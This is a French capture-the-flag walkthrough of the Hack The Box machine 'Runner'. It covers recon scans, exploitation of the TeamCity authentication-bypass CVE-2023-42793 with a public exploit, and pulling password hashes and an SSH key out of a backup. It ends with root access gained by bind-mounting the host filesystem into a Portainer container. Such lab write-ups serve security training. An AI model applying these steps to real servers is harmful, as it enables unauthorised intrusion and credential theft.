  # Runner

	echo "10.10.11.13 runner.htb" >> /etc/hosts
    echo "10.10.11.13 teamcity.runner.htb" >> /etc/hosts
    echo "10.10.11.13 portainer-administration.runner.htb" >> /etc/hosts
   
	sudo masscan -p1-65535,U:1-65535 10.10.11.13 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.13 -oN nmap.txt
	
Scans classiques.

    PORT     STATE SERVICE     VERSION                                                                                  
    22/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)                             
    80/tcp   open  http        nginx 1.18.0 (Ubuntu)                                                                    
    8000/tcp open  nagios-nsca Nagios NSCA

Fuzzing : 

	feroxbuster --silent -u http://runner.htb
    feroxbuster --silent -u http://runner.htb:8000
    ffuf -H "Host: FUZZ.runner.htb" -u http://runner.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 154

> http://runner.htb:8000/health <br>
> http://runner.htb:8000/version

On voit un **"seamless CI/CD Magic, powered by TeamCity!"** dans le code source. 

Un CVE assez récent semble exister. 
Voir : https://github.com/H454NSec/CVE-2023-42793 

Un sous-domaine **teamcity.runner.htb** semble bien exister comme décrit dans le CVE, bien qu'il ne soit pas trouvé par les wordlists classiques à première vue.

Utilisation du CVE :

    python exp.py -u http://teamcity.runner.htb

Se connecter avec le compte généré.

Dans la partie "Backup" on voit un fichier téléchargeable : 

> 	/data/teamcity_server/datadir/backup/TeamCity_Backup.zip 

Dans cette sauvegarde, dans le dossier **/database_dump/users**, on trouve plusieurs hashes BCRYPT dont un cassable en quelques minutes, celui de Matthew.

On trouve aussi une clé SSH pour John (son nom se trouve dans le panneau de configuration TeamCity avec celui de Matthew) dans le dossier **/config/projects/AllProjects/pluginData/ssh_keys**

    chmod 600 id_rsa
    ssh john@runner.htb -i id_rsa
    cat user.txt

## Élévation de privilèges

    cat /etc/nginx/sites-enabled/portainer 

> server_name portainer-administration.runner.htb

On peut se connecter sur ce portail avec Matthew et son mot de passe obtenu plus haut. On a le droit de créer de nouveaux containers. On peut donc simplement monter un volume relié aux dossiers que l'on veut lire.

1) Créer un volume avec les options suivantes : 

- device : '/'
- o : 'bind'
- type : 'none'

2) Créer un container avec ce volume attaché à un chemin /mnt/root par exemple, et bien prendre l'image "ubuntu:latest"

3) Démarrer la console du container 

4) Afficher le flag dans le dossier choisi plus haut : 

      cat /mnt/root/root/root.txt
